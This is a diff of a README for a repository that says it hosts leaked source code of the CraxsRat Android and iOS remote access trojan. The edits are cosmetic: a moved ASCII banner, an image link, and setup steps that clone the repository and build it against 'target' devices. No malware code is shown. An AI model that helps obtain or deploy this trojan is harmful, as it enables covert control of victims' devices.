@@ -1,32 +1,12 @@
 # CarpaAlko
 
-```shell
-         ____
-        |    |
-  @xxxx[{:::::::::>
-       _|____|_  
-        /  ee`.    
-      .<     __0   
-     /\ \.-.' \         …ᘛ⁐̤ᕐᐷ___X
-    J  `.|`.\/ \   
-    | |_.|  | | |  CarpaAlko - Broken trust
-     \__.'`.|-' /       Remote Access
-     L   /|o`--'\ 
-     |  /\/\/\   \           
-     J /      `.__\
-     |/         /  \     
-      \\      .'`.  `.     
-    ____)_/\_(____`.  '/
-   (___._/  \_.___) `-/
-```
+<a href="https://github.com/byt3n33dl3/"><p align="center">
+<img width="200" height="200" src="/cxo/mal.png">
+</p></a>
 
 ## CarpaAlko Source Code
 
-This repository contains the leaked source code of **CraxsRat**, a sophisticated Android && iOS remote access trojan ( **RAT** ) developed by "EVLF DEV". CraxsRat has been used in various cyber-attacks to grant cybercriminals extensive control over infected devices.
-
-<a href="https://github.com/byt3n33dl3/"><p align="center">
-<img src="/cxo/mal.png">
-</p></a>
+This repository contains the leaked source code of **CraxsRat**, a sophisticated Android && iOS remote access trojan ( **RAT** ) developed by "EVLF DEV". CraxsRat has been used in various cyber-attacks to grant cybercriminals extensive control over infected devices.<br><br>
 
 ## Disclaimer
 
@@ -140,6 +120,26 @@ This repository contains the leaked source code of **CraxsRat**, a sophisticated
 
 </div></details>
 
+```shell
+         ____
+        |    |
+  @xxxx[{:::::::::>
+       _|____|_  
+        /  ee`.    
+      .<     __0   
+     /\ \.-.' \         …ᘛ⁐̤ᕐᐷ___X
+    J  `.|`.\/ \   
+    | |_.|  | | |  CarpaAlko - Broken trust
+     \__.'`.|-' /       Remote Access
+     L   /|o`--'\ 
+     |  /\/\/\   \           
+     J /      `.__\
+     |/         /  \     
+      \\      .'`.  `.     
+    ____)_/\_(____`.  '/
+   (___._/  \_.___) `-/
+```
+
 ## Requirements
 
 - Android && iOS device ( target )
@@ -148,10 +148,10 @@ This repository contains the leaked source code of **CraxsRat**, a sophisticated
 ## Setup
 
 1. **Clone the Repository**:
-   ```sh
+   ```python3
    git clone https://github.com/byt3n33dl3/CarpaAlko.git
    cd CarpaAlko
-   cd CarpaAlko_v7
+   cd carpaalko-latest
    ```
 
 2. **Open it with vs & Builder Configuration**:
